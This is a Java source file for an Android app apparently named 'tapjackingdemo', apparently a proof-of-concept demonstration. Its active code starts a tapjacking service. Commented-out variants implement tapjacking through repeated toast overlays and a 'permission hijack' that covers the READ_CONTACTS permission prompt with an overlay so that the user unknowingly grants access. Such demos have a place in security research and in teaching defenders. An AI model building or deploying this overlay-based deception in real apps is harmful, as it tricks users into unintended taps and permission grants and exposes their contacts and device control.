package com.thz.tapjackingdemo;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.SeekBar;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    // SIMPLE TAPJACK ATTACK

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startService(new Intent(this, TapjackService.class));

        finish();
    }




   // TAPJACKING BY TOAST ABUSE

    /*private static int SEEK_MAX = 100;

    private Intent service;

    // UI elements
    SeekBar left;
    SeekBar top;
    EditText repRate;

    // seekbar change listener
    SeekBar.OnSeekBarChangeListener positionListner;

    // phone display dimensions
    int width, height;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // get the dimensions of the tapjacking image
        BitmapDrawable bd = (BitmapDrawable) this.getResources().getDrawable(
                R.mipmap.ic_launcher);
        int h = bd.getBitmap().getHeight();
        int w = bd.getBitmap().getWidth();

        Display display = getWindowManager().getDefaultDisplay();

        // get the display dimensions, these are used to determine how far a
        // given offset should move the image. as the offset uses the top left
        // corner as the point from which it is calculated the width and height
        // of the poc image are subtracted from the height and width of the
        // screen
       Point size = new Point();
            display.getSize(size);
            width = size.x - w;
            height = size.y - h;


        // instantiate UI elements
        left = (SeekBar) findViewById(R.id.seekLeftOffset);
        top = (SeekBar) findViewById(R.id.seekTopOffset);
        repRate = (EditText) findViewById(R.id.edtRepetionRate);

        // define the actions to be performed when a user interacts with the
        // seekbar
        positionListner = new SeekBar.OnSeekBarChangeListener() {
            Toast temp = new Toast(getApplicationContext());
            ImageView img = new ImageView(getApplicationContext());

            @Override
            public void onStopTrackingTouch(SeekBar seekBar) {
                // pop up the tapjacking image so that the user can see where it
                // is
                img.setImageResource(R.mipmap.ic_launcher);
                temp.setView(img);
                temp.setDuration(Toast.LENGTH_SHORT);
                temp.setGravity(Gravity.TOP | Gravity.LEFT,
                        (int) (left.getProgress() * width / (SEEK_MAX)),
                        (int) (top.getProgress() * height / (SEEK_MAX)));
                temp.show();
            }

            @Override
            public void onStartTrackingTouch(SeekBar seekBar) {
                // when they start moving the image, cancel the old display
                temp.cancel();
                stopService(service);

            }

            @Override
            public void onProgressChanged(SeekBar seekBar, int progress,
                                          boolean fromUser) {
                // do nothing, nobody cares
            }
        };

        // set the seekbar listener to both the left and top bars
        left.setOnSeekBarChangeListener(positionListner);
        top.setOnSeekBarChangeListener(positionListner);

        // start a new intent for the ToastService
        service = new Intent(this, ToastService.class);
    }


    *//**
     * Start the Tapjacking Service
     *
     * @param view
     *//*


    public void startTJService(View view) {
        // try and get the repetition period specified by the user, if the value
        // entered is not a valid number, log the error
        int rep = 15000;
        try {
            rep = Integer.parseInt(repRate.getText().toString()) * 1000;
        } catch (Exception e) {
            Log.w("_com_example_tapjacking",
                    "Failed to convert repetion value to a number, using default value");
            rep=15000;
        }
        service.putExtra("_com_example_tapjacking_topOffset",
                (int) (top.getProgress() * height / (SEEK_MAX)));
        service.putExtra("_com_example_tapjacking_leftOffset",
                (int) (left.getProgress() * width / (SEEK_MAX)));
        service.putExtra("_com_example_tapjacking_repetitionTime", rep);
        this.startService(service);
    }

    *//**
     * Stop the Tapjacking Service
     *
     * @param view
     *//*
    public void stopTJService(View view) {
        this.stopService(service);
    }*/

    // PERMISSION HIJACK
/*
    private static final int PERMISSIONS_REQUEST_CODE = 1;

    private Handler mHandler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startOverlayService("WORM_UP");

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startOverlayService("SHOW");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_CODE);
                }
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        startOverlayServiceDelayed("HIDE");

        if (requestCode == PERMISSIONS_REQUEST_CODE && grantResults.length > 0
                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            showContacts();
        }
    }

    private void startOverlayService(String action) {
        Intent intent = new Intent(action);
        intent.setClassName("com.thz.tapjackingdemo", "com.thz.tapjackingdemo.OverlayService");
        startService(intent);
    }

    private void showContacts() {
        getFragmentManager()
                .beginTransaction()
                .replace(R.id.contactListContainer, new ContactListFragment())
                .commit();
    }

    private void startOverlayServiceDelayed(final String action) {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                startOverlayService(action);
            }
        }, 100);
    }*/
}
